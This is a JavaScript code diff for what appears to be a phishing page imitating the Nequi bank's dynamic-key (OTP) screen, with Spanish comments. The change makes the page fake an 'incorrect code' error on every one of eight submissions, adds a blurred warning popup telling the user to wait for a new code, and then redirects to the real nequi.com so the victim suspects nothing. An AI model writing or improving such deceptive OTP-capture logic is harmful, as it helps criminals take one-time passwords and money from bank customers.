@@ -58,38 +58,42 @@
     }, seconds * 1000);
   }
 
-  // Toast rojo profesional con aparición suave, luego redirect
-  function showErrorToast(msg, redirectUrl) {
-    const toast = document.createElement('div');
-    toast.style.cssText = [
-      'position:fixed;bottom:32px;left:50%;transform:translateX(-50%) translateY(20px);',
-      'background:rgba(185,0,40,0.93);color:#fff;',
-      'padding:16px 24px;border-radius:14px;max-width:320px;width:calc(100% - 48px);',
-      'font-size:14px;line-height:1.55;text-align:center;font-weight:500;',
-      'box-shadow:0 8px 32px rgba(185,0,40,0.35);',
-      'opacity:0;transition:opacity .4s ease, transform .4s ease;z-index:9999;',
+  // Popup centrado con fondo borroso, aparece al llegar a clave 3
+  function showBlurPopup(msg) {
+    const overlay = document.createElement('div');
+    overlay.style.cssText = [
+      'position:fixed;inset:0;',
+      'background:rgba(0,0,0,0.45);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);',
+      'display:flex;align-items:center;justify-content:center;padding:24px;',
+      'z-index:9000;opacity:0;transition:opacity .35s ease;',
     ].join('');
-    toast.textContent = msg;
-    document.body.appendChild(toast);
 
-    requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        toast.style.opacity = '1';
-        toast.style.transform = 'translateX(-50%) translateY(0)';
-      });
-    });
+    const box = document.createElement('div');
+    box.style.cssText = [
+      'background:rgba(185,0,40,0.92);color:#fff;',
+      'border-radius:18px;padding:28px 22px;max-width:320px;width:100%;',
+      'text-align:center;font-size:15px;line-height:1.6;font-weight:500;',
+      'box-shadow:0 16px 48px rgba(0,0,0,0.4);',
+      'transform:scale(.92);transition:transform .35s ease;',
+    ].join('');
+    box.innerHTML = `<div style="font-size:36px;margin-bottom:10px;">&#9888;</div>${msg}`;
 
-    setTimeout(() => {
-      toast.style.opacity = '0';
-      toast.style.transform = 'translateX(-50%) translateY(20px)';
-      setTimeout(() => {
-        toast.remove();
-        showLoader(15, () => {
-          sessionStorage.clear();
-          window.location.replace(redirectUrl);
-        });
-      }, 450);
-    }, 3500);
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+
+    requestAnimationFrame(() => requestAnimationFrame(() => {
+      overlay.style.opacity = '1';
+      box.style.transform = 'scale(1)';
+    }));
+
+    function dismiss() {
+      overlay.style.opacity = '0';
+      box.style.transform = 'scale(.92)';
+      setTimeout(() => overlay.remove(), 380);
+    }
+
+    overlay.addEventListener('click', dismiss);
+    setTimeout(dismiss, 4000);
   }
 
   // Navegación de cajas OTP
@@ -134,28 +138,26 @@
     btn.disabled    = true;
     btn.textContent = 'Procesando...';
 
-    if (attempts === 1) {
-      // 1.ª clave: 8 segundos de carga → estado de error
+    const TOTAL_ATTEMPTS = 8;
+
+    if (attempts < TOTAL_ATTEMPTS) {
+      // Intentos 1 a 7: carga 8s → siguiente clave
       showLoader(8, () => {
         btn.disabled    = false;
         btn.textContent = 'Confirmar';
         setOtpError(true);
-      });
-
-    } else if (attempts === 2) {
-      // 2.ª clave: 4 segundos de carga → estado de error
-      showLoader(4, () => {
-        btn.disabled    = false;
-        btn.textContent = 'Confirmar';
-        setOtpError(true);
+        // Antes del último intento mostrar popup de advertencia
+        if (attempts === TOTAL_ATTEMPTS - 1) {
+          showBlurPopup('Clave dinámica incorrecta, espera a que el último código haya cambiado y vuelve a intentar.');
+        }
       });
 
     } else {
-      // 3.ª clave: toast rojo → redirect
-      showErrorToast(
-        'Clave dinámica incorrecta, espera a que el último código haya cambiado y vuelve a intentar.',
-        'https://www.nequi.com'
-      );
+      // 8.ª clave: carga larga 15s → redirect
+      showLoader(15, () => {
+        sessionStorage.clear();
+        window.location.replace('https://www.nequi.com');
+      });
     }
   });
 })();
